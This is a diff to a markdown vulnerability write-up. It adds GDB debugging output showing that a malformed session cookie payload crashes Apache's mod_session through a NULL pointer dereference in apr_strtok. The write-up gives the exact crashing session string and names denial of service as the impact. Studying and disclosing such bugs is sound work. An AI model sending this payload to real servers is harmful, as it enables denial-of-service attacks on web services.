@@ -376,6 +376,65 @@ Server-side, we can check the ```error_log``` and see the following:
 - ```last``` becomes NULL after parsing a malformed session string.
 - The second call to ```apr_strtok(NULL, sep, &last)``` then **tries to dereference a NULL pointer, causing a segmentation fault.**
 
+### Proof w/ GDB
+We set a breakpoint for ```session_identity_decode()```, print all variables of interest, and step through the program.
+When we hit the breakpoint, we discovered that ```z->encoded```
+```bash
+(gdb) print z->encoded
+$2 = 0x7f58149fde08 "expiry=", 'A' <repeats 11 times>, "&="
+```
+1. This confirms that my payload is reaching ```session_identity_decode()```.
+2. The session data is ```"expiry=AAAAAAAAAAA&="```
+3. There is an empty key-value pair at the end ```&=```, which does not have a valid key or value.
+
+**We continue to check for pair, last, and encoded**
+```bash
+(gdb) print encoded
+$3 = <optimized out>
+(gdb) print *encoded
+value has been optimized out
+(gdb) print pair
+$4 = <optimized out>
+(gdb) print *pair
+value has been optimized out
+(gdb) print last
+$5 = 0x7f5814db0629 <session_cookie_load+377> "1\300\351=\377\377\377\270\377\377\377\377\351\063\377\377\377\350\021\372\377\377\220ATI\211\374UH\211\365SH\205\322t\032\200:"
+(gdb) print *last  
+$6 = 49 '1'
+```
+Here, ```last``` is pointing to memory and is not NULL.
+This means ```apr_strtok()``` has not yet failed.
+
+**Stepping through, we get to the...last...part of our journey.**
+```bash
+(gdb) step
+401     in mod_session.c
+$13 = (session_rec *) 0x7f58149fde20
+$14 = 0x7f58149fde08 "expiry=", 'A' <repeats 11 times>, "&="
+$15 = <optimized out>
+value has been optimized out
+(gdb) print pair
+$16 = <optimized out>
+(gdb) print *pair
+value has been optimized out
+(gdb) print last
+$17 = 0x0
+(gdb) print *last
+Cannot access memory at address 0x0
+```
+Here is our proof.
+1. ```last = 0x0``` (NULL pointer)
+2. ```print *last``` fails because we tried to access memory at address 0x0
+3. This confirm ```last``` was used in a way that set it to NULL before ```apr_strtok()``` was called again.
+
+**Confirmation of the crash**
+```bash
+Program received signal SIGSEGV, Segmentation fault.
+0x00007f58150a560c in apr_strtok () from /usr/lib/x86_64-linux-gnu/libapr-1.so.0
+```
+This confirms that the crash happens inside ```apr_strtok()```.
+You can review my [gdb crash here](gdb1.txt)
+and the [step-through session here](gdb2.txt)
 
 ### **Impact of Exploitation** 
 When the server processes such a cookie, the absence of proper validation leads to a NULL pointer dereference, causing the Apache process handling the request to crash. Repeated exploitation can lead to a denial of service (DoS), affecting availability of the web service.
